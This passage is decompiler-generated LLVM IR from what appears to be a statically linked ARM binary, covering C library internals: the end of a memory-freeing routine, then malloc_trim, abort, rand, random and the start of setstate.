  %v1_177fc = add i32 %v3_177f4, -4
  store i32 %v1_177fc, i32* @r2, align 4
  %v4_17800 = mul nuw i32 %v3_177f8, 4
  %v5_17800 = add i32 %v4_17800, %v1_177fc
  %v6_17800 = inttoptr i32 %v5_17800 to i32*
  %v7_17800 = load i32, i32* %v6_17800, align 4
  store i32 %v7_17800, i32* %r3.global-to-local, align 4
  %v1_17804 = load i32, i32* @r5, align 4
  %v2_17804 = add i32 %v1_17804, 8
  %v3_17804 = inttoptr i32 %v2_17804 to i32*
  store i32 %v7_17800, i32* %v3_17804, align 4
  %v0_17808 = load i32, i32* @r5, align 4
  %v1_17808 = load i32, i32* @r2, align 4
  %v2_17808 = load i32, i32* %r1.global-to-local, align 4
  %v5_17808 = mul i32 %v2_17808, 4
  %v6_17808 = add i32 %v5_17808, %v1_17808
  %v7_17808 = inttoptr i32 %v6_17808 to i32*
  store i32 %v0_17808, i32* %v7_17808, align 4
  br label %dec_label_pc_17974

dec_label_pc_17810:                               ; preds = %dec_label_pc_17790
  %v1_17810 = and i32 %v3_177d4, 2
  %v2_17810 = icmp eq i32 %v1_17810, 0
  br i1 %v2_17810, label %dec_label_pc_17818, label %dec_label_pc_1794c

dec_label_pc_17818:                               ; preds = %dec_label_pc_17810
  %v1_17818 = or i32 %v2_177d8, 1
  store i32 %v1_17818, i32* %r3.global-to-local, align 4
  store i32 %v1_17818, i32* %v1_177d8, align 4
  %v0_17820 = load i32, i32* @r6, align 4
  %v1_17820 = add i32 %v0_17820, -4
  %v2_17820 = inttoptr i32 %v1_17820 to i32*
  %v3_17820 = load i32, i32* %v2_17820, align 4
  store i32 %v3_17820, i32* %r3.global-to-local, align 4
  %v0_17824 = load i32, i32* @r5, align 4
  %v1_17824 = load i32, i32* %ip.global-to-local, align 4
  %v2_17824 = add i32 %v1_17824, %v0_17824
  store i32 %v2_17824, i32* %lr.global-to-local, align 4
  %v1_17828 = urem i32 %v3_17820, 2
  %v2_17828 = icmp eq i32 %v1_17828, 0
  %v1_1782c = add i32 %v2_17824, 4
  %v2_1782c = inttoptr i32 %v1_1782c to i32*
  %v3_1782c = load i32, i32* %v2_1782c, align 4
  store i32 %v3_1782c, i32* %r8.global-to-local, align 4
  br i1 %v2_17828, label %dec_label_pc_17834, label %dec_label_pc_17868

dec_label_pc_17834:                               ; preds = %dec_label_pc_17818
  %v1_17834 = add i32 %v0_17820, -8
  %v2_17834 = inttoptr i32 %v1_17834 to i32*
  %v3_17834 = load i32, i32* %v2_17834, align 4
  store i32 %v3_17834, i32* %r1.global-to-local, align 4
  %v2_17838 = sub i32 %v0_17824, %v3_17834
  store i32 %v2_17838, i32* %r3.global-to-local, align 4
  %v1_1783c = add i32 %v2_17838, 8
  %v2_1783c = inttoptr i32 %v1_1783c to i32*
  %v3_1783c = load i32, i32* %v2_1783c, align 4
  store i32 %v3_1783c, i32* %r2.global-to-local, align 4
  %v1_17840 = add i32 %v3_1783c, 12
  %v2_17840 = inttoptr i32 %v1_17840 to i32*
  %v3_17840 = load i32, i32* %v2_17840, align 4
  store i32 %v3_17840, i32* %r4.global-to-local, align 4
  %v9_17844 = icmp eq i32 %v3_17840, %v2_17838
  %v1_17848 = add i32 %v2_17838, 12
  %v2_17848 = inttoptr i32 %v1_17848 to i32*
  %v3_17848 = load i32, i32* %v2_17848, align 4
  store i32 %v3_17848, i32* %r0.global-to-local, align 4
  br i1 %v9_17844, label %dec_label_pc_17850, label %dec_label_pc_178b4

dec_label_pc_17850:                               ; preds = %dec_label_pc_17834
  %v1_17850 = add i32 %v3_17848, 8
  %v2_17850 = inttoptr i32 %v1_17850 to i32*
  %v3_17850 = load i32, i32* %v2_17850, align 4
  store i32 %v3_17850, i32* %r3.global-to-local, align 4
  %v9_17854 = icmp eq i32 %v3_17850, %v2_17838
  br i1 %v9_17854, label %dec_label_pc_1785c, label %dec_label_pc_178b4

dec_label_pc_1785c:                               ; preds = %dec_label_pc_17850
  store i32 %v3_1783c, i32* %v2_17850, align 4
  %v0_17860 = load i32, i32* %r0.global-to-local, align 4
  %v1_17860 = load i32, i32* %r2.global-to-local, align 4
  %v2_17860 = add i32 %v1_17860, 12
  %v3_17860 = inttoptr i32 %v2_17860 to i32*
  store i32 %v0_17860, i32* %v3_17860, align 4
  %v0_17864 = load i32, i32* %ip.global-to-local, align 4
  %v1_17864 = load i32, i32* %r1.global-to-local, align 4
  %v2_17864 = add i32 %v1_17864, %v0_17864
  store i32 %v2_17864, i32* %ip.global-to-local, align 4
  %v0_17874.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17878.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17868

dec_label_pc_17868:                               ; preds = %dec_label_pc_17818, %dec_label_pc_1785c
  %v0_178f4 = phi i32 [ %v1_17824, %dec_label_pc_17818 ], [ %v2_17864, %dec_label_pc_1785c ]
  %v0_17878 = phi i32 [ %v3_1782c, %dec_label_pc_17818 ], [ %v0_17878.pre, %dec_label_pc_1785c ]
  %v1_1788c = phi i32 [ %v2_17824, %dec_label_pc_17818 ], [ %v0_17874.pre, %dec_label_pc_1785c ]
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_1786c = load i32, i32* @r7, align 4
  %v2_1786c = add i32 %v0_1786c, 72
  %v3_1786c = inttoptr i32 %v2_1786c to i32*
  %v4_1786c = load i32, i32* %v3_1786c, align 4
  store i32 %v4_1786c, i32* @r2, align 4
  %v1_17870 = add i32 %v4_1786c, 44
  %v2_17870 = inttoptr i32 %v1_17870 to i32*
  %v3_17870 = load i32, i32* %v2_17870, align 4
  store i32 %v3_17870, i32* %r3.global-to-local, align 4
  %v9_17874 = icmp eq i32 %v1_1788c, %v3_17870
  %v1_17878 = and i32 %v0_17878, -4
  store i32 %v1_17878, i32* %r0.global-to-local, align 4
  br i1 %v9_17874, label %dec_label_pc_178f4, label %dec_label_pc_17880

dec_label_pc_17880:                               ; preds = %dec_label_pc_17868
  %v2_17880 = add i32 %v1_1788c, %v1_17878
  store i32 %v2_17880, i32* %r3.global-to-local, align 4
  %v1_17884 = add i32 %v2_17880, 4
  %v2_17884 = inttoptr i32 %v1_17884 to i32*
  %v3_17884 = load i32, i32* %v2_17884, align 4
  store i32 %v3_17884, i32* %r3.global-to-local, align 4
  %v1_17888 = urem i32 %v3_17884, 2
  %v2_17888 = icmp eq i32 %v1_17888, 0
  %v2_1788c = add i32 %v1_1788c, 4
  %v3_1788c = inttoptr i32 %v2_1788c to i32*
  store i32 %v1_17878, i32* %v3_1788c, align 4
  br i1 %v2_17888, label %dec_label_pc_17894, label %dec_label_pc_17880.dec_label_pc_178c4_crit_edge

dec_label_pc_17880.dec_label_pc_178c4_crit_edge:  ; preds = %dec_label_pc_17880
  %v0_178d4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_178c4

dec_label_pc_17894:                               ; preds = %dec_label_pc_17880
  %v0_17894 = load i32, i32* %lr.global-to-local, align 4
  %v1_17894 = add i32 %v0_17894, 8
  %v2_17894 = inttoptr i32 %v1_17894 to i32*
  %v3_17894 = load i32, i32* %v2_17894, align 4
  store i32 %v3_17894, i32* %r1.global-to-local, align 4
  %v1_17898 = add i32 %v3_17894, 12
  %v2_17898 = inttoptr i32 %v1_17898 to i32*
  %v3_17898 = load i32, i32* %v2_17898, align 4
  store i32 %v3_17898, i32* %r3.global-to-local, align 4
  %v9_1789c = icmp eq i32 %v3_17898, %v0_17894
  %v1_178a0 = add i32 %v0_17894, 12
  %v2_178a0 = inttoptr i32 %v1_178a0 to i32*
  %v3_178a0 = load i32, i32* %v2_178a0, align 4
  store i32 %v3_178a0, i32* %r2.global-to-local, align 4
  br i1 %v9_1789c, label %dec_label_pc_178a8, label %dec_label_pc_178b4

dec_label_pc_178a8:                               ; preds = %dec_label_pc_17894
  %v1_178a8 = add i32 %v3_178a0, 8
  %v2_178a8 = inttoptr i32 %v1_178a8 to i32*
  %v3_178a8 = load i32, i32* %v2_178a8, align 4
  store i32 %v3_178a8, i32* %r3.global-to-local, align 4
  %v9_178ac = icmp eq i32 %v3_178a8, %v0_17894
  br i1 %v9_178ac, label %dec_label_pc_178b8, label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_17894, %dec_label_pc_17850, %dec_label_pc_17834, %dec_label_pc_178a8
  %v0_178b4 = call i32 @abort()
  store i32 %v0_178b4, i32* %r0.global-to-local, align 4
  %v0_178b8.pre = load i32, i32* @r1, align 4
  %v1_178b8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_178b8

dec_label_pc_178b8:                               ; preds = %dec_label_pc_178a8, %dec_label_pc_178b4
  %v1_178b8 = phi i32 [ %v3_178a0, %dec_label_pc_178a8 ], [ %v1_178b8.pre, %dec_label_pc_178b4 ]
  %v0_178b8 = phi i32 [ %v3_17894, %dec_label_pc_178a8 ], [ %v0_178b8.pre, %dec_label_pc_178b4 ]
  %v2_178b8 = add i32 %v1_178b8, 8
  %v3_178b8 = inttoptr i32 %v2_178b8 to i32*
  store i32 %v0_178b8, i32* %v3_178b8, align 4
  %v0_178bc = load i32, i32* %r2.global-to-local, align 4
  %v1_178bc = load i32, i32* %r1.global-to-local, align 4
  %v2_178bc = add i32 %v1_178bc, 12
  %v3_178bc = inttoptr i32 %v2_178bc to i32*
  store i32 %v0_178bc, i32* %v3_178bc, align 4
  %v0_178c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_178c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_178c0 = add i32 %v1_178c0, %v0_178c0
  store i32 %v2_178c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_178c4

dec_label_pc_178c4:                               ; preds = %dec_label_pc_17880.dec_label_pc_178c4_crit_edge, %dec_label_pc_178b8
  %v0_178d4 = phi i32 [ %v0_178d4.pre, %dec_label_pc_17880.dec_label_pc_178c4_crit_edge ], [ %v2_178c0, %dec_label_pc_178b8 ]
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_178c8 = load i32, i32* @r7, align 4
  %v2_178c8 = add i32 %v0_178c8, 72
  %v3_178c8 = inttoptr i32 %v2_178c8 to i32*
  %v4_178c8 = load i32, i32* %v3_178c8, align 4
  %v1_178cc = add i32 %v4_178c8, 52
  store i32 %v1_178cc, i32* %r3.global-to-local, align 4
  %v1_178d0 = add i32 %v4_178c8, 60
  %v2_178d0 = inttoptr i32 %v1_178d0 to i32*
  %v3_178d0 = load i32, i32* %v2_178d0, align 4
  store i32 %v3_178d0, i32* %r1.global-to-local, align 4
  %v1_178d4 = or i32 %v0_178d4, 1
  store i32 %v1_178d4, i32* @r2, align 4
  %v1_178d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_178d8 = add i32 %v1_178d8, 12
  %v3_178d8 = inttoptr i32 %v2_178d8 to i32*
  store i32 %v1_178cc, i32* %v3_178d8, align 4
  %v0_178dc = load i32, i32* %r1.global-to-local, align 4
  %v1_178dc = load i32, i32* %r4.global-to-local, align 4
  %v2_178dc = add i32 %v1_178dc, 8
  %v3_178dc = inttoptr i32 %v2_178dc to i32*
  store i32 %v0_178dc, i32* %v3_178dc, align 4
  %v0_178e0 = load i32, i32* @r2, align 4
  %v1_178e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_178e0 = add i32 %v1_178e0, 4
  %v3_178e0 = inttoptr i32 %v2_178e0 to i32*
  store i32 %v0_178e0, i32* %v3_178e0, align 4
  %v0_178e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_178e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_178e4 = add i32 %v1_178e4, %v0_178e4
  %v4_178e4 = inttoptr i32 %v3_178e4 to i32*
  store i32 %v0_178e4, i32* %v4_178e4, align 4
  %v0_178e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_178e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_178e8 = add i32 %v1_178e8, 12
  %v3_178e8 = inttoptr i32 %v2_178e8 to i32*
  store i32 %v0_178e8, i32* %v3_178e8, align 4
  %v0_178ec = load i32, i32* %r4.global-to-local, align 4
  %v1_178ec = load i32, i32* %r3.global-to-local, align 4
  %v2_178ec = add i32 %v1_178ec, 8
  %v3_178ec = inttoptr i32 %v2_178ec to i32*
  store i32 %v0_178ec, i32* %v3_178ec, align 4
  br label %dec_label_pc_17904

dec_label_pc_178f4:                               ; preds = %dec_label_pc_17868
  %v2_178f4 = add i32 %v1_17878, %v0_178f4
  store i32 %v2_178f4, i32* %ip.global-to-local, align 4
  %v1_178f8 = or i32 %v2_178f4, 1
  store i32 %v1_178f8, i32* %r3.global-to-local, align 4
  %v0_178fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_178fc, i32* %v2_17870, align 4
  %v0_17900 = load i32, i32* %r3.global-to-local, align 4
  %v1_17900 = load i32, i32* %r4.global-to-local, align 4
  %v2_17900 = add i32 %v1_17900, 4
  %v3_17900 = inttoptr i32 %v2_17900 to i32*
  store i32 %v0_17900, i32* %v3_17900, align 4
  br label %dec_label_pc_17904

dec_label_pc_17904:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_178f4
  %v0_17904 = load i32, i32* %ip.global-to-local, align 4
  %v3_17908 = icmp ult i32 %v0_17904, 131070
  br i1 %v3_17908, label %dec_label_pc_17974, label %dec_label_pc_1790c

dec_label_pc_1790c:                               ; preds = %dec_label_pc_17904
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_17910 = load i32, i32* @r7, align 4
  %v2_17910 = add i32 %v0_17910, 72
  %v3_17910 = inttoptr i32 %v2_17910 to i32*
  %v4_17910 = load i32, i32* %v3_17910, align 4
  store i32 %v4_17910, i32* @r4, align 4
  %v1_17914 = inttoptr i32 %v4_17910 to i32*
  %v2_17914 = load i32, i32* %v1_17914, align 4
  store i32 %v2_17914, i32* %r3.global-to-local, align 4
  %v1_17918 = and i32 %v2_17914, 2
  %v2_17918 = icmp eq i32 %v1_17918, 0
  br i1 %v2_17918, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1790c
  store i32 %v4_17910, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1790c, %bb
  %v1_17920 = xor i1 %v2_17918, true
  call void @__pseudo_cond_branch(i1 %v1_17920, i32 ptrtoint (i32* @global_var_175c4.1478 to i32))
  %v0_17924 = load i32, i32* @r4, align 4
  %v1_17924 = add i32 %v0_17924, 44
  %v2_17924 = inttoptr i32 %v1_17924 to i32*
  %v3_17924 = load i32, i32* %v2_17924, align 4
  store i32 %v3_17924, i32* %r3.global-to-local, align 4
  %v1_17928 = add i32 %v3_17924, 4
  %v2_17928 = inttoptr i32 %v1_17928 to i32*
  %v3_17928 = load i32, i32* %v2_17928, align 4
  store i32 %v3_17928, i32* %r3.global-to-local, align 4
  %v1_1792c = add i32 %v0_17924, 836
  %v2_1792c = inttoptr i32 %v1_1792c to i32*
  %v3_1792c = load i32, i32* %v2_1792c, align 4
  store i32 %v3_1792c, i32* @r2, align 4
  %v1_17930 = and i32 %v3_17928, -4
  store i32 %v1_17930, i32* %r3.global-to-local, align 4
  %v3_17934 = icmp ult i32 %v1_17930, %v3_1792c
  br i1 %v3_17934, label %dec_label_pc_17974, label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %bb16
  store i32 %v0_17924, i32* %r1.global-to-local, align 4
  %v1_17940 = add i32 %v0_17924, 840
  %v2_17940 = inttoptr i32 %v1_17940 to i32*
  %v3_17940 = load i32, i32* %v2_17940, align 4
  store i32 %v3_17940, i32* %r0.global-to-local, align 4
  %v2_17944 = call i32 @__malloc_trim(i32 %v3_17940, i32 %v0_17924)
  store i32 %v2_17944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17974

dec_label_pc_1794c:                               ; preds = %dec_label_pc_17810
  %v2_1794c = inttoptr i32 %v1_177e0 to i32*
  %v3_1794c = load i32, i32* %v2_1794c, align 4
  store i32 %v3_1794c, i32* %r0.global-to-local, align 4
  %v1_17950 = add i32 %v4_177d0, 848
  %v2_17950 = inttoptr i32 %v1_17950 to i32*
  %v3_17950 = load i32, i32* %v2_17950, align 4
  store i32 %v3_17950, i32* %r2.global-to-local, align 4
  %v1_17954 = add i32 %v4_177d0, 868
  %v2_17954 = inttoptr i32 %v1_17954 to i32*
  %v3_17954 = load i32, i32* %v2_17954, align 4
  %v2_17958 = add i32 %v3_1794c, %v1_177dc
  store i32 %v2_17958, i32* %r1.global-to-local, align 4
  %v1_1795c = add i32 %v3_17950, -1
  store i32 %v1_1795c, i32* %r2.global-to-local, align 4
  %v2_17960 = sub i32 %v3_17954, %v2_17958
  store i32 %v2_17960, i32* %r3.global-to-local, align 4
  store i32 %v2_17960, i32* %v2_17954, align 4
  %v1_17968 = load i32, i32* @lr, align 4
  %v2_17968 = add i32 %v1_17968, 848
  %v3_17968 = inttoptr i32 %v2_17968 to i32*
  store i32 %v1_1795c, i32* %v3_17968, align 4
  %v0_1796c = load i32, i32* %r0.global-to-local, align 4
  %v1_1796c = load i32, i32* @r5, align 4
  %v2_1796c = sub i32 %v1_1796c, %v0_1796c
  store i32 %v2_1796c, i32* %r0.global-to-local, align 4
  %v4_17970 = call i32 @munmap(i32 %v2_1796c, i32 %v2_17958, i32 %v1_1795c, i32 %v2_17960)
  store i32 %v4_17970, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17974

dec_label_pc_17974:                               ; preds = %bb16, %dec_label_pc_17904, %dec_label_pc_1793c, %dec_label_pc_177f0, %dec_label_pc_1794c
  store i32 %v2_17784, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 52, i32* @r3, align 4
  %v0_17980 = load i32, i32* @r7, align 4
  %v2_17980 = add i32 %v0_17980, 52
  %v3_17980 = inttoptr i32 %v2_17980 to i32*
  %v4_17980 = load i32, i32* %v3_17980, align 4
  store i32 %v4_17980, i32* @ip, align 4
  store i32 96652, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17980)
  br label %dec_label_pc_1798c

dec_label_pc_1798c:                               ; preds = %entry, %dec_label_pc_17974
  store i32 %v3_17778, i32* @r4, align 4
  store i32 %v6_17778, i32* @r5, align 4
  store i32 %v9_17778, i32* @r6, align 4
  store i32 %v12_17778, i32* @r7, align 4
  store i32 %v18_17778, i32* @lr, align 4
  ret i32 %v2_17784

; uselistorder directives
  uselistorder i32 %v0_17924, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_178e4, { 1, 0 }
  uselistorder i32 %v1_17824, { 1, 0 }
  uselistorder i32 %v0_17824, { 1, 0 }
  uselistorder i32 %v3_177f8, { 1, 0 }
  uselistorder i32 %v1_177dc, { 1, 0, 2 }
  uselistorder i32 %v2_177d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_177d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17780, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1798c, { 1, 0 }
  uselistorder label %dec_label_pc_17974, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_17904, { 1, 0 }
  uselistorder label %dec_label_pc_178c4, { 1, 0 }
  uselistorder label %dec_label_pc_178b8, { 1, 0 }
  uselistorder label %dec_label_pc_178b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17868, { 1, 0 }
}

define i32 @function_1799c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1799c:
  %v0_1799c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1799c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1799c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1799c, %bb
  %v10_179b0 = phi i32 [ %arg1, %dec_label_pc_1799c ], [ 0, %bb ]
  ret i32 %v10_179b0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_179b4 = load i32, i32* @r4, align 4
  store i32 %v3_179b4, i32* %stack_var_-12, align 4
  %v6_179b4 = load i32, i32* @r5, align 4
  %v4_179c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_179c4, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_179c4, i32* @r0, align 4
  %v0_179d4 = call i32 @__malloc_consolidate()
  %v0_179d8 = load i32, i32* @r4, align 4
  %v0_179dc = load i32, i32* @r5, align 4
  %v2_179e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_179e4, i32* @r4, align 4
  store i32 %v6_179b4, i32* @r5, align 4
  %v2_179e8 = call i32 @__malloc_trim(i32 %v0_179d8, i32 %v0_179dc)
  %v0_179ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_179ec, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_179f0 = phi i32 [ %v2_179e8, %entry ], [ 0, %bb ]
  ret i32 %v4_179f0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  %v4_17a0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 20) to i32*), align 4
  store i32 96792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17a0c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_17a34 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_17a3c = load i32, i32* @r5, align 4
  %v2_17a3c = add i32 %v0_17a3c, 26320
  %v3_17a3c = inttoptr i32 %v2_17a3c to i32*
  %v4_17a3c = load i32, i32* %v3_17a3c, align 4
  %v2_17a40 = icmp eq i32 %v4_17a3c, 0
  br i1 %v2_17a40, label %dec_label_pc_17a48, label %dec_label_pc_17a88

dec_label_pc_17a48:                               ; preds = %entry
  store i32 1, i32* %v3_17a3c, align 4
  br label %dec_label_pc_17a50

dec_label_pc_17a50:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_17a48
  %v0_17a54 = load i32, i32* @r5, align 4
  %v2_17a54 = add i32 %v0_17a54, 908
  store i32 %v2_17a54, i32* @r4, align 4
  %v2_17a60 = add i32 %v0_17a54, 76
  %v3_17a60 = inttoptr i32 %v2_17a60 to i32*
  %v4_17a60 = load i32, i32* %v3_17a60, align 4
  call void @__pseudo_branch(i32 %v4_17a60)
  %v1_17a70 = call i32 @__GI_raise(i32 6)
  %v0_17a7c = load i32, i32* @r5, align 4
  %v2_17a7c = add i32 %v0_17a7c, 20
  %v3_17a7c = inttoptr i32 %v2_17a7c to i32*
  %v4_17a7c = load i32, i32* %v3_17a7c, align 4
  store i32 96904, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17a7c)
  %v0_17a8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %entry, %dec_label_pc_17a50
  %v1_17aa0 = phi i32 [ %v0_17a3c, %entry ], [ %v0_17a8c.pre, %dec_label_pc_17a50 ]
  %v2_17a8c = add i32 %v1_17aa0, 26320
  %v3_17a8c = inttoptr i32 %v2_17a8c to i32*
  %v4_17a8c = load i32, i32* %v3_17a8c, align 4
  %v7_17a90 = icmp eq i32 %v4_17a8c, 1
  br i1 %v7_17a90, label %dec_label_pc_17a98, label %dec_label_pc_17ad4

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a88
  %v2_17a98 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_17a98, i32* @r4, align 4
  store i32 2, i32* %v3_17a8c, align 4
  %v3_17ab0 = bitcast i32* %stack_var_-28 to i8*
  %v4_17ab0 = call i32 @__GI_memset(i8* %v3_17ab0, i32 0, i32 20)
  %v3_17acc = call i32 @__libc_sigaction(i32 6, i32 %v2_17a98, i32 0)
  br label %dec_label_pc_17a50

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17a88
  %v7_17ad4 = icmp eq i32 %v4_17a8c, 2
  br i1 %v7_17ad4, label %dec_label_pc_17adc, label %dec_label_pc_17ae8

dec_label_pc_17adc:                               ; preds = %dec_label_pc_17ad4
  store i32 3, i32* %v3_17a8c, align 4
  %v0_17ae4 = call i32 @abort()
  %v0_17ae8.pre = load i32, i32* @r5, align 4
  %v1_17ae8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_17ae8

dec_label_pc_17ae8:                               ; preds = %dec_label_pc_17ad4, %dec_label_pc_17adc
  %v3_17af4 = phi i32 [ 26320, %dec_label_pc_17ad4 ], [ %v1_17ae8.pre, %dec_label_pc_17adc ]
  %v2_17af4 = phi i32 [ %v1_17aa0, %dec_label_pc_17ad4 ], [ %v0_17ae8.pre, %dec_label_pc_17adc ]
  %v2_17ae8 = add i32 %v2_17af4, %v3_17af4
  %v3_17ae8 = inttoptr i32 %v2_17ae8 to i32*
  %v4_17ae8 = load i32, i32* %v3_17ae8, align 4
  %v7_17aec = icmp eq i32 %v4_17ae8, 3
  br i1 %v7_17aec, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17ae8
  store i32 4, i32* %v3_17ae8, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17ae8, %bb
  call void @__pseudo_cond_branch(i1 %v7_17aec, i32 ptrtoint (i32* @global_var_13fdc.1487 to i32))
  br label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17b00, %.thread2
  %v0_17b00 = call i32 @abort()
  br label %dec_label_pc_17b00

; uselistorder directives
  uselistorder i32* %v3_17a8c, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17ae8, { 1, 0 }
  uselistorder label %dec_label_pc_17a88, { 1, 0 }
}

define i32 @function_17b0c(i64* %arg1) local_unnamed_addr {
dec_label_pc_17b0c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_17b0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b0c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17b0c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17b0c, %bb
  %v4_17b18 = phi i32 [ %tmp, %dec_label_pc_17b0c ], [ 0, %bb ]
  ret i32 %v4_17b18

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_17b24 = call i32 @random()
  ret i32 %v0_17b24
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_17b34 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  %v4_17b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17b64)
  %v0_17b78 = load i32, i32* @r4, align 4
  %v2_17b78 = add i32 %v0_17b78, 20
  %v3_17b78 = inttoptr i32 %v2_17b78 to i32*
  %v4_17b78 = load i32, i32* %v3_17b78, align 4
  store i32 ptrtoint (i32* @global_var_17b84.1494 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17b78)
  %v2_17b88 = ptrtoint i32* %stack_var_-20 to i32
  %v0_17b8c = load i32, i32* @r4, align 4
  %v2_17b8c = add i32 %v0_17b8c, 1084
  %v2_17b90 = inttoptr i32 %v2_17b8c to i32*
  %v3_17b90 = call i32 @__GI_random_r(i32* %v2_17b90, i32 %v2_17b88)
  %v0_17ba0 = load i32, i32* @r4, align 4
  %v2_17ba0 = add i32 %v0_17ba0, 52
  %v3_17ba0 = inttoptr i32 %v2_17ba0 to i32*
  %v4_17ba0 = load i32, i32* %v3_17ba0, align 4
  call void @__pseudo_branch(i32 %v4_17ba0)
  %v3_17bac = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_17b34, i32* @r4, align 4
  ret i32 %v3_17bac
}

define i32 @function_17bc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_17bc0:
  %v0_17bc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17bc0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17bc0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17bc0, %bb
  %v10_17bd4 = phi i32 [ %arg1, %dec_label_pc_17bc0 ], [ 0, %bb ]
  ret i32 %v10_17bd4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
